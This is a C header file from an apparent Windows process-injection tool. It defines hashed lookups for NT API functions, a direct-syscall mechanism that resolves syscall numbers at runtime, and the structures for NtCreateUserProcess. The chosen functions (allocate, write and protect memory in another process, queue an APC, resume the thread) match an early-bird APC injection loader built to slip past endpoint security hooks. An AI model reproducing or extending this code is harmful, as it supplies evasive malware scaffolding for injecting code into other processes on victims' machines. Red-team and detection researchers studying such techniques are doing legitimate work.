#pragma once
#include <windows.h>
#include <stdio.h>
#include "structs.h"

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Debug messages
#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) wprintf(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) wprintf(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) fwprintf(stderr, L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",   \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n", \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

// Function hashes
#define NTDLL_HASH 0xFE1C9FDFBE5AEBB2
#define RtlCreateProcessParametersEx_HASH 0xF50F17BE7FFAF260
#define NtCreateUserProcess_HASH 0x36D1504721B3355E
#define NtAllocateVirtualMemory_HASH 0x27C46715930B2DD1
#define NtWriteVirtualMemory_HASH 0x234014A49CB69837
#define NtProtectVirtualMemory_HASH 0x588440E0CB6B10AD
#define NtQueueApcThread_HASH 0x3516818EC1C3885D
#define NtResumeThread_HASH 0x9629F0788153D615
#define NtClose_HASH 0xAAAA38FF81D313C2

// Direct syscalls implementation
#define UP     -32
#define DOWN    32
#define RANGE  0xFF

typedef struct _NTDLL_CONFIG {
    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions   
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions       
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions     
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll                 
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs  

} NTDLL_CONFIG, * PNTDLL_CONFIG;

typedef struct _NT_SYSCALL {
    DWORD dwSSN;                    // syscall number
    DWORD dwSyscallHash;            // syscall hash value
    PVOID pSyscallAddress;          // syscall address
} NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTAPI_FUNC {
    NT_SYSCALL NtCreateUserProcess;
    NT_SYSCALL NtAllocateVirtualMemory;
    NT_SYSCALL NtProtectVirtualMemory;
    NT_SYSCALL NtWriteVirtualMemory;
    NT_SYSCALL NtQueueApcThread; 
    NT_SYSCALL NtResumeThread; 
    NT_SYSCALL NtClose; 
} NTAPI_FUNC, * PNTAPI_FUNC;

// Functions prototypes for direct syscall invokation
extern VOID PrepareSyscall(WORD wSystemCall);
extern RunSyscall();

PTEB RtlGetThreadEnvironmentBlock();
DWORD64 djb2(PBYTE str);
VOID PrintHashes();
BOOL InitializeDirectSyscalls(IN PNTAPI_FUNC Nt);
VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer);
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD64 dwApiNameHash); 
HMODULE GetModuleHandleH(IN DWORD64 dwModuleNameHash); 

// Structs for NtCreateUserProcess
typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1]; // Number of attributes
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx) (
    _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
);
